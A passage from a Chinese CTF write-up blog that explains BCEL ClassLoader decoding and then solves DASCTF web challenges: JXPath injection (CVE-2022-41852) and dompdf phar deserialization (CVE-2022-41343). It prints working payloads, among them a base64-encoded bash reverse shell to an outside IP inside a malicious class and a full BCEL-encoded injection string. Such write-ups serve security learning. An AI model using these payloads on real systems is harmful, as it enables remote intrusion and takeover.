class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>createClass()</code>中,通过<code>subString()</code>截取$$$BCEL$$$后的字符串，并调用<code>Utility.decode</code>进行相应的解码并最终返回改字节码的bytes数组(decode方法参数uncompress用来标识是否为zip流，当为true时走zip流解码)。之后生成<code>Parser</code>解析器并调用<code>parse()</code>方法进行解析，并生成<code>JavaClass</code>对象<br>createClass源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> JavaClass <span class="title function_">createClass</span><span class="params">(String class_name)</span> &#123;</span><br><span class="line">    <span class="type">int</span>    <span class="variable">index</span>     <span class="operator">=</span> class_name.indexOf(<span class="string">&quot;$$BCEL$$&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">real_name</span> <span class="operator">=</span> class_name.substring(index + <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaClass</span> <span class="variable">clazz</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="type">byte</span>[]      bytes  = Utility.decode(real_name, <span class="literal">true</span>);</span><br><span class="line">      <span class="type">ClassParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassParser</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes), <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">      clazz = parser.parse();</span><br><span class="line">    &#125; <span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Adapt the class name to the passed value</span></span><br><span class="line">    <span class="type">ConstantPool</span> <span class="variable">cp</span> <span class="operator">=</span> clazz.getConstantPool();</span><br><span class="line"></span><br><span class="line">    <span class="type">ConstantClass</span> <span class="variable">cl</span> <span class="operator">=</span> (ConstantClass)cp.getConstant(clazz.getClassNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Class);</span><br><span class="line">    <span class="type">ConstantUtf8</span> <span class="variable">name</span> <span class="operator">=</span> (ConstantUtf8)cp.getConstant(cl.getNameIndex(),</span><br><span class="line">                                                     Constants.CONSTANT_Utf8);</span><br><span class="line">    name.setBytes(class_name.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425212337403.png" alt="image-20230425212337403"></p><p>这里就是前面为什么要进行字节码编码的原因，因为这里会进行解码</p><p><strong>Utility.decode()源码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Decode a string back to a byte array.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> bytes the byte array to convert</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> uncompress use gzip to uncompress the stream of bytes</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] decode(String s, <span class="type">boolean</span> uncompress) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">  <span class="type">char</span>[] chars = s.toCharArray();</span><br><span class="line"></span><br><span class="line">  <span class="type">CharArrayReader</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharArrayReader</span>(chars);</span><br><span class="line">  <span class="type">JavaReader</span>      <span class="variable">jr</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaReader</span>(car);</span><br><span class="line"></span><br><span class="line">  <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> ch;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>((ch = jr.read()) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    bos.write(ch);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  bos.close();</span><br><span class="line">  car.close();</span><br><span class="line">  jr.close();</span><br><span class="line"></span><br><span class="line">  <span class="type">byte</span>[] bytes = bos.toByteArray();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(uncompress) &#123;</span><br><span class="line">    <span class="type">GZIPInputStream</span> <span class="variable">gis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes));</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] tmp   = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length * <span class="number">3</span>]; <span class="comment">// Rough estimate</span></span><br><span class="line">    <span class="type">int</span>    <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>    b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>((b = gis.read()) &gt;= <span class="number">0</span>)</span><br><span class="line">      tmp[count++] = (<span class="type">byte</span>)b;</span><br><span class="line"></span><br><span class="line">    bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[count];</span><br><span class="line">    System.arraycopy(tmp, <span class="number">0</span>, bytes, <span class="number">0</span>, count);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后获取到了该<code>JavaClass</code>对象的bytes数组并调用java原生的<code>defineClass()</code>加载</p><p><img src="../images/image-20230425213242406.png" alt="image-20230425213242406"></p><p>之后就是在<code>newInstance()</code>时初始化触发静态代码块执行</p><p>之后调用<code>createClass()</code>方法拿到一个<code>JavaClass</code>对象最终通过<code>defineClass()</code>加载字节码还原类。</p><p><strong>这里就是为什么要用javaclass和utility编码的原因</strong></p><p><strong>上面的参考文章里还有一些题目是利用BCEl的，可以去参考参考一下</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> BCEL Java ClassLoader </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-WEB-复现</title>
      <link href="/posts/8a205ef3.html"/>
      <url>/posts/8a205ef3.html</url>
      
        <content type="html"><![CDATA[<h2 id="ezjxpath"><a href="#ezjxpath" class="headerlink" title="ezjxpath"></a><strong>ezjxpath</strong></h2><p><strong>cve-2022-41852</strong></p><p>这里看别的师傅的博客写的是<strong>TCTF中的非预期解</strong></p><p>刚开始的时候,发现这是个CVE漏洞，但是google能搜到的方法他全给ban了，所以这个得自己去找利用链子来打</p><p><img src="../images/image-20230424202815660.png" alt="image-20230424202815660"></p><p>这里的话是给了一个不知道啥玩意的东西，然后把jar包下载下来进行查看</p><p><img src="../images/image-20230424203035639.png" alt="image-20230424203035639"></p><p>就是这里产生了漏洞利用点</p><p><strong>网上能查到的payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;exec(java.lang.Runtime.getRuntime(), &#x27;calc&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext.new(\&quot;http://127.0.0.1:9000/spring-Evil.xml\&quot;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JXPathContext</span> <span class="variable">context</span> <span class="operator">=</span> JXPathContext.newContext(<span class="literal">null</span>);</span><br><span class="line">        context.getValue(<span class="string">&quot;javax.naming.InitialContext.doLookup(&#x27;rmi://127.0.0.1:1099/1u560y&#x27;)&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>就是这常见的三种，但是都给ban掉了</p><p><img src="../images/image-20230424203330834.png" alt="image-20230424203330834"></p><p>于是我们就得自己去寻找链子来打了</p><p>如此一来我们只能另寻蹊跷了，赛后就突然想到TCTF里的非预期解好多都是静态方法，而这里我们也是用静态方法去利用的<br><code>com.sun.org.apache.bcel.internal.util.JavaWrapper</code>，这个类的<code>_main</code>方法逻辑如下</p><p>这个类在<code>rt.jar</code>包里，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">/* Expects class name as first argument, other arguments are by-passed.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Missing class name.&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">class_name</span> <span class="operator">=</span> argv[<span class="number">0</span>];</span><br><span class="line">    String[] new_argv = <span class="keyword">new</span> <span class="title class_">String</span>[argv.length - <span class="number">1</span>];</span><br><span class="line">    System.arraycopy(argv, <span class="number">1</span>, new_argv, <span class="number">0</span>, new_argv.length);</span><br><span class="line"></span><br><span class="line">    <span class="type">JavaWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWrapper</span>();</span><br><span class="line">    wrapper.runMain(class_name, new_argv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>主要逻辑在于runMain方法里面，class_name和new_argv就是类名和参数，逻辑如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runMain</span><span class="params">(String class_name, String[] argv)</span> <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span>   <span class="variable">cl</span>    <span class="operator">=</span> loader.loadClass(class_name);</span><br><span class="line">  <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method = cl.getMethod(<span class="string">&quot;_main&quot;</span>,  <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; argv.getClass() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method _main is sane ?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>   <span class="variable">m</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> method.getReturnType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(Modifier.isPublic(m) &amp;&amp; Modifier.isStatic(m)) ||</span><br><span class="line">       Modifier.isAbstract(m) || (r != Void.TYPE))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(NoSuchMethodException no) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;In class &quot;</span> + class_name +</span><br><span class="line">                       <span class="string">&quot;: public static void _main(String[] argv) is not defined&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; argv &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>loader.loadClass(class_name);</code>处显然是有类加载的，而这个loader仔细一看会发现是一个BCEL</p><p><img src="../images/image-20230425195757268.png" alt="image-20230425195757268"></p><p>根据这道题在重新捡一下<strong>动态类加载</strong>   进行复习一下</p><p>这里的话考察的是  <a href="https://www.cnblogs.com/CoLo/p/15869871.html#about-bcel">Java安全之BCEL ClassLoader</a></p><p>既然有这个东西，那么我们就写篇文章来学一下这个<code>BCEL ClassLoader</code></p><p>然后对于上述的JavaWrapper类，最后loadclass后会去调用恶意类的_main方法，那我们只需要复刻一下恶意类就好了</p><p><strong>下面的就是恶意类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">calc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230425224414705.png" alt="image-20230425224414705"></p><p><strong>随之把他编译为字节码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);</span><br><span class="line">        Class.forName(<span class="string">&quot;$$BCEL$$&quot;</span>+code,<span class="literal">true</span>,<span class="keyword">new</span> <span class="title class_">ClassLoader</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后打入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.getValue(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper._main(split(&#x27;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$5dO$TA$U$3dC$b7$5d$ba$ae$C$c5$ef$_$aab$y$d2$ba$R$88$n$a91i$9ab4$db$WiS$82$3e$98$e92$d9N$d3$dd$r$bb$db$ba$80$fc$u_$d4$f8$e0$P$f0G$Z$ef$b4$84$Sa$92$993s$ee$99s$e7$de$cc$9f$bf$bf$7e$Dx$89$a7$G2$b8m$e0$O$ee$ce$e2$9e$c2$fb$3a$k$e8x$c8$90y$z$7d$Z$bfaH$VV$3a$MZ5$d8$X$Ms$b6$f4Ec$e8uE$d8$e6$dd$B19$3bp$f8$a0$c3C$a9$ce$a7$a4$W$f7d4$8e$85$ae$r$S$ee$j$M$84E2$a7$cc$90$fe$ecq$e93$dc$y$7c$b2$fb$7c$c4$ad$B$f7$5d$ab$V$87$d2w$cb$e3T$3ctG$M$8b$97$84$Z$8cZ$e2$88$83X$G$7e$a4c$89$c4$T3u$87$S$g$ad$60$Y$3abK$aaGdU$c2$X$ca$c3$84$8eY$jy$T$8f$f0$98$81wy$d4$cb$97$9c$fc$b1pzAq$cf$db$3a$e2$d5J$cc$5b$95$d5$f7$b22$fa$f8$b6$b3f$af$ef$f4$9d$eafRo$7f$Y$d6$db$b55$bb_K$9a$ad$8d$c3F$bb$3ej$i9$eb$8d$c3$ca$97m$b9$97$9c$7c$3d$s3$f1j$a3X$da$9f$ec$7b$c5$92$3c1$f1$E$cb$M$f3$ff$97O$d4$b4$a6f$b7$_$9c$98$K$jS2$b0$de5$cf$8acX$98$Kw$86$7e$y$3d$aa$c8pE$7cv$b8QX$b1$_h$a8C$9aH$E$rzV$b8$a4$bb$e7$a8$ed0pD$U$95$a9$ri$fa$Ej$a4$c0T$a3h$cd$d2$c9$od$84$e9$e7$3f$c0$be$d1f$G$G$ad$99$J$89$x$b4$9a$a7$7b$TW$J$b3$b8$869R$a9$cb$9b$84$wf$fc$c4L$$$f5$j$da$ee$d4$c1$m$E$r$caR$aa$a9$8b$81y$y$Q$e6hj$c4$yR$fc$3a$f9M$k$b3JS$a9$$$3c$c4$3cgA$3d$Z$5b$d0$df$g$abn$fd$D$f9$9fP$X$e8$C$A$A&#x27;,&#x27;,&#x27;))&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里用到的split来获取数组，因为_main只接受数组参数</p><p><img src="../images/image-20230425224659954.png" alt="image-20230425224659954"></p><p><img src="../images/image-20230426104354659.png" alt="image-20230426104354659"></p><p>在这里loadclass返回恶意类之后，然后调用了恶意类里的_main方法，然后就到题目的</p><p><code>context.getvalue()</code>方法，这个方法会调用到invoke方法，然后进行命令执行。</p><h2 id="pdf-converter-revenge"><a href="#pdf-converter-revenge" class="headerlink" title="pdf_converter_revenge"></a>pdf_converter_revenge</h2><p>题目</p><p><img src="../images/image-20230426105232681.png" alt="image-20230426105232681"></p><p>查看给的源码发现这里存在一个路劲，然后发现了这个thinkphp版本，这里的非预期解是可以直接拿thinkphp   v5.0.21的poc直接打</p><p><strong>接下来讲一下预期解</strong></p><p><strong>考点：Phar反序列化</strong></p><p><img src="../images/image-20230426105634466.png" alt="image-20230426105634466"></p><p>发现有一个依赖叫做<strong>dompdf</strong></p><p><a href="http://buaq.net/go-129526.html">CVE-2022-41343 - 通过 Phar 反序列化的 RCE</a></p><p>这里的话根据版本号去google搜索漏洞的话，还是可以搜到一些漏洞分析文章的</p><p><a href="https://www.ctfiot.com/79602.html">DomPDF库反序列化RCE漏洞分析</a></p><p>这两篇文章都可以进行参考</p><p><strong>漏洞点</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line">        <span class="variable">$entry</span>[<span class="variable">$styleString</span>] = <span class="variable">$localFile</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Download the remote file</span></span><br><span class="line">        [<span class="variable">$protocol</span>] = <span class="title class_">Helpers</span>::<span class="title function_ invoke__">explode_url</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">        <span class="variable">$allowed_protocols</span> = <span class="variable language_">$this</span>-&gt;options-&gt;<span class="title function_ invoke__">getAllowedProtocols</span>();</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$protocol</span>, <span class="variable">$allowed_protocols</span>)) &#123;</span><br><span class="line">            <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Permission denied on <span class="subst">$remoteFile</span>. The communication protocol is not supported.&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$allowed_protocols</span>[<span class="variable">$protocol</span>][<span class="string">&quot;rules&quot;</span>] <span class="keyword">as</span> <span class="variable">$rule</span>) &#123;</span><br><span class="line">            [<span class="variable">$result</span>, <span class="variable">$message</span>] = <span class="variable">$rule</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> !== <span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="title class_">Helpers</span>::<span class="title function_ invoke__">record_warnings</span>(E_USER_WARNING, <span class="string">&quot;Error loading <span class="subst">$remoteFile</span>: <span class="subst">$message</span>&quot;</span>, <span class="keyword">__FILE__</span>, <span class="keyword">__LINE__</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$remoteFileContent</span>, <span class="variable">$http_response_header</span>) = @<span class="title class_">Helpers</span>::<span class="title function_ invoke__">getFileContent</span>(<span class="variable">$remoteFile</span>, <span class="variable">$context</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remoteFileContent</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230426111849366.png" alt="image-20230426111849366"></p><p>主要错误就在这一段，在<code>if ($result !== true)</code>后并没有return来结束，因此可以进入<code>getFileContent</code>函数，这意味着可以使用任何协议，然后包括主角phar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getFileContent</span>(<span class="params"><span class="variable">$uri</span>, <span class="variable">$context</span> = <span class="literal">null</span>, <span class="variable">$offset</span> = <span class="number">0</span>, <span class="variable">$maxlen</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="literal">null</span>;</span><br><span class="line">        <span 